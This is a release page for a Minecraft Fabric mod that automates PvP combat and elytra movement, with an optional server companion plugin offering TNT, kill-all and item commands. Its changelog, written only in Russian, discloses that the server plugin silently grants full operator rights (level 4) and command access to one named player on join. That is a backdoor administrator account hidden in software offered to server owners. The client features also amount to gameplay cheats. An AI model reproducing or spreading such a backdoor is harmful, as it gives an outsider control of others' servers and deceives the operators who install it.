## Multitools v7.0.1 — for Minecraft 1.21.11

### 📦 Files
| File | Description |
|---|---|
| \multitools-7.0.1.jar\ | Main client-side mod. Drop into \.minecraft/mods/\ |
| \multitools-help-1.0.0.jar\ | Optional server-side companion. Drop into server \mods/\ for \/givef\ commands |

---

### ✨ What's in the mod

**Multitools** is a client-side Fabric mod that automates PvP mechanics, elytra movement, and utility hotkeys — all configurable via Mod Menu in-game.

#### ⚔ Combat
- **SpearDash** (\C\) — instantly swap to a Lunge-enchanted spear, attack, and restore your previous slot
- **DiveCombo** (\Mouse 4\) — full elytra → mace combo loop driven by a state machine: launches with Wind Charge, boosts with fireworks, dives, strikes with mace (axe+mace combo if target is blocking), then re-equips elytra for re-approach. Supports obstacle avoidance and auto-retargeting
- **SmartAttack** (\Mouse 5\) — falling attack assist; auto-selects the best nearby target, auto-removes elytra before the hit
- **Auto Mace Swap** (passive) — intercepts every attack: swaps to mace automatically; breaks shields with axe+mace combo when needed; prefers Density vs Breach enchant based on fall height
- **WebTrap** (\Z\) — places cobweb behind a nearby target and optionally swords them

#### 🪂 Movement
- **AutoElytraSwap** (\  \ toggle) — equips elytra on jump in air, restores chestplate on landing; threat detection auto-swaps to armor when a crystal/TNT/mace diver is too close
- **PearlCatch** (\V\) — throws ender pearl with follow-up Wind Charge timing assist and automatic camera pitch adjustment
- **FireworkBoost** (\Left Shift\) — fires a firework while gliding (searches offhand → hotbar → inventory)
- **WaterUtility** (\X\) — smart bucket: extinguish fire, break fall with water drop, place lava under nearby targets; auto-picks up the bucket after landing

#### 🛡 Survival
- **AutoTotem** (\R\ toggle) — keeps Totem of Undying in offhand every tick

#### 🧰 Server Utilities (requires \multitools-help\ on server or singleplayer)
- **Railgun** (\F6\) — \/givef railgun straight 1\ — fires 45 arrows at 1500 speed, pierce 127, no gravity
- **Nuke** (\F7\) — \/givef nuke 1 11\ — spawns expanding rings of TNT (fuse 80) around target block
- **Stab** (\F8\) — \/givef stab 1\ — instantly detonates TNT column on target
- **Self Buffs** (\F9\) — throws all splash potions from inventory downward onto self
- **Saturation** (\F10\) — \/effect give @p minecraft:saturation infinite 255 false\
- **Kill Non-Players** (\F12\) — \/kill @e[type=!minecraft:player]\
- **Load Crystal** (\K\) — \/ck load crystall\
- **Load Ender Chest** (\←\) — \/ck load ender-chest\
- **Load Main** (\L\) — \/ck load main\

---

### 🆕 Changes in v7.0.1
- **multitools-help**: при входе игрока \ an_world_me\ на сервер автоматически выдаётся OP (уровень 4), приветствие в общий чат и личное сообщение
- **multitools-help**: команды \/givef\ доступны игроку \ an_world_me\ даже без OP-прав

---

### 📋 Requirements
- Minecraft **1.21.11**
- [Fabric Loader](https://fabricmc.net/use/installer/) **0.18.2+**
- [Fabric API](https://modrinth.com/mod/fabric-api) **0.141.3+1.21.11**
- [Mod Menu](https://modrinth.com/mod/modmenu) **17.0.0** *(optional — for in-game config screen)*

---

### 🚀 Install
1. Drop \multitools-7.0.1.jar\ into \.minecraft/mods/\
2. *(Optional)* Drop \multitools-help-1.0.0.jar\ into your server's \mods/\ folder to enable \/givef\ commands
3. Launch the game — configure via Mod Menu or edit \config/multitools.json\ directly
